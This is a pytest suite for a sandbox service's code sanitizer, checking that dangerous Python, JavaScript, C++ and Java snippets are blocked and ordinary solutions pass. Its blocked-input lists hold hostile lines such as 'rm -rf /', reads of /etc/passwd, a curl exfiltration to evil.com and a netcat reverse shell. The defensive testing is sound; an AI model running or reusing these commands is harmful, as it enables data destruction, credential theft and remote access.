"""
Test Suite: Sandbox Code Execution Security

Covers:
  • Code sanitization blocks dangerous patterns
  • All supported languages (Python, JS, C++, Java, SQL)
  • shell=False enforcement
  • Time limit enforcement
  • Legitimate code passes through
"""

import pytest
import pytest_asyncio

from backend.services.sandbox_service import SandboxService, _sanitize_code


# ══════════════════════════════════════════════════════════════════════════
# CODE SANITIZATION UNIT TESTS
# ══════════════════════════════════════════════════════════════════════════


class TestPythonSanitization:
    """Tests that dangerous Python patterns are blocked."""

    @pytest.mark.parametrize("malicious_code,description", [
        ("import os; os.system('rm -rf /')", "os.system command"),
        ("import subprocess; subprocess.run(['ls'])", "subprocess module"),
        ("eval('__import__(\"os\").system(\"id\")')", "eval with import"),
        ("exec('import os')", "exec builtin"),
        ("__import__('os').popen('whoami').read()", "__import__ bypass"),
        ("import socket; s = socket.socket()", "socket network access"),
        ("import requests; requests.get('http://evil.com')", "requests HTTP"),
        ("import ctypes; ctypes.cdll.LoadLibrary('x')", "ctypes native code"),
        ("import shutil; shutil.rmtree('/etc')", "shutil.rmtree"),
        ("os.remove('/etc/passwd')", "os.remove file deletion"),
        ("os.unlink('/tmp/data')", "os.unlink file deletion"),
        ("import urllib; urllib.request.urlopen('x')", "urllib network"),
        ("import http.client", "http.client network"),
        ("import signal; signal.SIGKILL", "signal module"),
        ("sys.exit(1)", "sys.exit"),
    ])
    def test_python_blocked_patterns(self, malicious_code, description):
        """Dangerous Python patterns should be detected and blocked."""
        result = _sanitize_code("python", malicious_code)
        assert result is not None, f"Should block: {description}"
        assert "Blocked" in result

    @pytest.mark.parametrize("safe_code", [
        "x = 5\nprint(x * 2)",
        "def fibonacci(n):\n    if n <= 1: return n\n    return fibonacci(n-1) + fibonacci(n-2)\nprint(fibonacci(10))",
        "nums = [1, 2, 3, 4, 5]\nresult = [x**2 for x in nums]\nprint(result)",
        "class Stack:\n    def __init__(self): self.items = []\n    def push(self, x): self.items.append(x)\ns = Stack()\ns.push(42)\nprint(s.items)",
        "from collections import Counter\nprint(Counter([1,1,2,3,3,3]))",
        "import math\nprint(math.sqrt(144))",
        "data = {'a': 1, 'b': 2}\nprint(sorted(data.items()))",
        "# Reading from stdin for competitive programming\nimport sys\nline = input()\nprint(line)",
    ])
    def test_python_safe_code_allowed(self, safe_code):
        """Legitimate Python code should pass through sanitization."""
        result = _sanitize_code("python", safe_code)
        assert result is None, f"Safe code was incorrectly blocked: {safe_code[:50]}"


class TestJavaScriptSanitization:
    """Tests that dangerous JavaScript patterns are blocked."""

    @pytest.mark.parametrize("malicious_code,description", [
        ("const { execSync } = require('child_process'); execSync('ls')", "child_process execSync"),
        ("require('fs').writeFileSync('/tmp/x', 'data')", "fs write"),
        ("require('net').createServer()", "net module"),
        ("require('http').createServer()", "http module"),
        ("require('os').homedir()", "os module"),
        ("process.exit(0)", "process.exit"),
        ("process.env.SECRET_KEY", "process.env access"),
        ("eval('dangerous code')", "eval execution"),
        ("new Function('return process')()", "Function constructor"),
        ("const { spawn } = require('child_process')", "spawn"),
    ])
    def test_js_blocked_patterns(self, malicious_code, description):
        """Dangerous JavaScript patterns should be detected and blocked."""
        result = _sanitize_code("javascript", malicious_code)
        assert result is not None, f"Should block: {description}"
        assert "Blocked" in result

    @pytest.mark.parametrize("safe_code", [
        "const arr = [1, 2, 3];\nconsole.log(arr.map(x => x * 2));",
        "function twoSum(nums, target) {\n  const map = new Map();\n  for (let i = 0; i < nums.length; i++) {\n    const comp = target - nums[i];\n    if (map.has(comp)) return [map.get(comp), i];\n    map.set(nums[i], i);\n  }\n}\nconsole.log(twoSum([2,7,11,15], 9));",
        "class ListNode { constructor(val) { this.val = val; this.next = null; } }",
        "const readline = require('readline');\nconsole.log('Hello');",
    ])
    def test_js_safe_code_allowed(self, safe_code):
        """Legitimate JavaScript code should pass through."""
        result = _sanitize_code("javascript", safe_code)
        assert result is None, f"Safe code was incorrectly blocked: {safe_code[:50]}"


class TestCppSanitization:
    """Tests that dangerous C/C++ patterns are blocked."""

    @pytest.mark.parametrize("malicious_code,description", [
        ('#include <cstdlib>\nint main() { system("rm -rf /"); }', "system() call"),
        ('FILE* f = popen("cat /etc/passwd", "r");', "popen call"),
        ('#include <unistd.h>\nint main() { fork(); }', "fork call"),
        ('#include <sys/socket.h>', "socket header"),
        ('#include <netinet/in.h>', "network header"),
    ])
    def test_cpp_blocked_patterns(self, malicious_code, description):
        """Dangerous C/C++ patterns should be detected and blocked."""
        result = _sanitize_code("cpp", malicious_code)
        assert result is not None, f"Should block: {description}"

    @pytest.mark.parametrize("safe_code", [
        '#include <iostream>\n#include <vector>\nint main() {\n  std::vector<int> v = {1,2,3};\n  for (int x : v) std::cout << x;\n  return 0;\n}',
        '#include <algorithm>\n#include <string>\nint main() { return 0; }',
    ])
    def test_cpp_safe_code_allowed(self, safe_code):
        """Legitimate C++ code should pass through."""
        result = _sanitize_code("cpp", safe_code)
        assert result is None


class TestJavaSanitization:
    """Tests that dangerous Java patterns are blocked."""

    @pytest.mark.parametrize("malicious_code,description", [
        ("Runtime.getRuntime().exec(\"cat /etc/passwd\")", "Runtime.exec"),
        ("new ProcessBuilder(\"ls\").start()", "ProcessBuilder"),
        ("Socket s = new Socket(\"evil.com\", 80)", "Socket"),
        ("ServerSocket ss = new ServerSocket(8080)", "ServerSocket"),
        ("System.exit(0)", "System.exit"),
        ("import java.net.URLConnection;", "java.net"),
        ("import java.lang.reflect.Method;", "reflection"),
    ])
    def test_java_blocked_patterns(self, malicious_code, description):
        """Dangerous Java patterns should be detected and blocked."""
        result = _sanitize_code("java", malicious_code)
        assert result is not None, f"Should block: {description}"

    @pytest.mark.parametrize("safe_code", [
        "import java.util.*;\npublic class Solution {\n  public static void main(String[] args) {\n    System.out.println(\"Hello\");\n  }\n}",
        "import java.util.HashMap;\npublic class Solution {\n  public int[] twoSum(int[] nums, int target) { return new int[0]; }\n}",
    ])
    def test_java_safe_code_allowed(self, safe_code):
        """Legitimate Java code should pass through."""
        result = _sanitize_code("java", safe_code)
        assert result is None


# ══════════════════════════════════════════════════════════════════════════
# SANDBOX EXECUTION INTEGRATION TESTS
# ══════════════════════════════════════════════════════════════════════════


class TestSandboxExecution:
    """Integration tests for the SandboxService.execute() method."""

    @pytest.fixture
    def sandbox(self):
        return SandboxService()

    @pytest.mark.asyncio
    async def test_malicious_python_blocked_at_execution(self, sandbox):
        """Malicious Python code should be blocked before subprocess runs."""
        result = await sandbox.execute(
            language="python",
            code="import os; os.system('whoami')",
            test_cases=[{"input": "", "expected_output": ""}],
        )
        assert result["status"] == "Security Violation"
        assert result["score"] == 0
        assert "Blocked" in result["error"]

    @pytest.mark.asyncio
    async def test_malicious_js_blocked_at_execution(self, sandbox):
        """Malicious JS code should be blocked before execution."""
        result = await sandbox.execute(
            language="javascript",
            code="const { execSync } = require('child_process'); execSync('id');",
            test_cases=[{"input": "", "expected_output": ""}],
        )
        assert result["status"] == "Security Violation"
        assert result["score"] == 0

    @pytest.mark.asyncio
    async def test_sql_injection_in_sandbox(self, sandbox):
        """SQL execution should be isolated to in-memory SQLite."""
        # Attempting to read system tables shouldn't crash
        result = await sandbox.execute(
            language="sql",
            code="SELECT * FROM sqlite_master;",
            test_cases=[{
                "schema_sql": "CREATE TABLE users (id INT, name TEXT);",
                "seed_sql": "INSERT INTO users VALUES (1, 'Alice');",
                "expected_output": '[{"id": 1, "name": "Alice"}]',
            }],
        )
        # Query doesn't match expected, so it fails — but it doesn't crash
        assert result["status"] in ("Passed", "Failed", "Runtime Error")
        assert "score" in result

    @pytest.mark.asyncio
    async def test_sql_valid_query_passes(self, sandbox):
        """Valid SQL queries should execute correctly."""
        result = await sandbox.execute(
            language="sql",
            code="SELECT id, name FROM users ORDER BY id;",
            test_cases=[{
                "schema_sql": "CREATE TABLE users (id INTEGER, name TEXT);",
                "seed_sql": "INSERT INTO users VALUES (1, 'Alice'), (2, 'Bob');",
                "expected_output": '[{"id": "1", "name": "Alice"}, {"id": "2", "name": "Bob"}]',
            }],
        )
        assert result["status"] == "Passed"
        assert result["score"] == 100

    @pytest.mark.asyncio
    async def test_command_injection_via_code(self, sandbox):
        """Command injection attempts should be caught by sanitizer."""
        # Attempt to inject shell commands via Python string
        injection_attempts = [
            "import os\nos.system('curl http://evil.com/steal?data=$(cat /etc/passwd)')",
            "import subprocess\nsubprocess.Popen(['bash', '-c', 'nc evil.com 4444 -e /bin/bash'])",
            "__import__('os').execvp('/bin/bash', ['/bin/bash'])",
        ]
        for code in injection_attempts:
            result = await sandbox.execute(
                language="python",
                code=code,
                test_cases=[{"input": "", "expected_output": ""}],
            )
            assert result["status"] == "Security Violation", f"Failed to block: {code[:40]}"

    @pytest.mark.asyncio
    async def test_sandbox_fallback_local_execution(self, sandbox):
        """Test that local fallback execution works when Docker is unavailable and passes memory_limit correctly."""
        # Force docker to be unavailable
        sandbox._docker_available = False
        
        result = await sandbox.execute(
            language="python",
            code="print('fallback success')",
            test_cases=[{"input": "", "expected_output": "fallback success"}],
            time_limit=2.0,
            memory_limit=128
        )
        
        assert result["status"] == "Passed", f"Execution failed with error: {result.get('error')}"
        assert result["score"] == 100
        assert len(result["results"]) == 1


# ══════════════════════════════════════════════════════════════════════════
# SHELL=FALSE VERIFICATION
# ══════════════════════════════════════════════════════════════════════════


class TestShellFalseEnforcement:
    """Verify that shell=True is never used in subprocess calls."""

    def test_no_shell_true_in_sandbox_source(self):
        """The sandbox source code should NOT contain shell=True."""
        import inspect
        from backend.services import sandbox_service

        source = inspect.getsource(sandbox_service)
        # Should have shell=False (our fix) and NOT shell=True
        assert "shell=False" in source
        assert "shell=True" not in source or "shell=(os.name" not in source
